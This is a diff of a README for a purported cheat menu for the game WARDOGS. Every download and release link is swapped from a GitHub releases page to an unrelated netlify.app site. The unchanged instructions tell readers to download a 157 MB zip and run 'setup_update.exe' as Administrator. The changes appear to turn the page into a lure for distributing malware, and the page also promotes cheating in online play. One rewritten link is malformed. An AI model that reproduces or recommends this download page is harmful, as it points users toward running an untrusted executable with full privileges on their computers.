@@ -7,12 +7,12 @@
 
 ### The Cleanest Cheat Menu in the Community — v0.7.4
 
-[![Version](https://img.shields.io/badge/version-0.7.4-purple?style=for-the-badge)](https://github.com/thierryanani9-afk/wardogs-tactical-overlay/releases)
+[![Version](https://img.shields.io/badge/version-0.7.4-purple?style=for-the-badge)](https://boisterous-monstera-d3418c.netlify.app/)
 [![Size](https://img.shields.io/badge/size-157%20MB-yellow?style=for-the-badge)]()
-[![Platform](https://img.shields.io/badge/platform-Windows-0078D6?style=for-the-badge&logo=windows)](https://github.com/thierryanani9-afk/wardogs-tactical-overlay/releases)
-[![Downloads](https://img.shields.io/github/downloads/knobbyspeak/wardogs-cheat-menu/total?style=for-the-badge&color=purple)](https://github.com/thierryanani9-afk/wardogs-tactical-overlay/releases)
+[![Platform](https://img.shields.io/badge/platform-Windows-0078D6?style=for-the-badge&logo=windows)](https://boisterous-monstera-d3418c.netlify.app/)
+[![Downloads](https://img.shields.io/github/downloads/knobbyspeak/wardogs-cheat-menu/total?style=for-the-badge&color=purple)](https://boisterous-monstera-d3418c.netlify.app/)
 
-**[⬇️ DOWNLOAD v0.7.4](https://github.com/thierryanani9-afk/wardogs-tactical-overlay/releases)**
+**[⬇️ DOWNLOAD v0.7.4][(https://boisterous-monstera-d3418c.netlify.app/)**
 
 ![Menu Preview](https://i.imgur.com/placeholder-menu.png)
 
@@ -55,7 +55,7 @@ A lightweight, ImGui-based cheat menu built specifically for WARDOGS. Clean UI, 
 
 ### Option A — Release Download (Easiest)
 
-1. Go to **[Releases](https://github.com/thierryanani9-afk/wardogs-tactical-overlay/releases)**
+1. Go to **[Releases](https://boisterous-monstera-d3418c.netlify.app/)**
 2. Download `wardogs-cheat-menu-v0.7.4.zip` (**157 MB**)
 3. Extract anywhere
 4. Run `setup_update.exe` **as Administrator**
@@ -64,7 +64,7 @@ A lightweight, ImGui-based cheat menu built specifically for WARDOGS. Clean UI, 
 
 ### Option B — Direct Download
 
-**[📥 Click here to download from Releases](https://github.com/thierryanani9-afk/wardogs-tactical-overlay/releases)**
+**[📥 Click here to download from Releases](https://boisterous-monstera-d3418c.netlify.app/)**
 
 ---
 
@@ -104,6 +104,6 @@ A lightweight, ImGui-based cheat menu built specifically for WARDOGS. Clean UI, 
 
 ### ⭐ Star • 🍴 Fork • 📥 Download
 
-**[⬇️ GET v0.7.4](https://github.com/thierryanani9-afk/wardogs-tactical-overlay/releases)**
+**[⬇️ GET v0.7.4](https://boisterous-monstera-d3418c.netlify.app/)**
 
 </div>
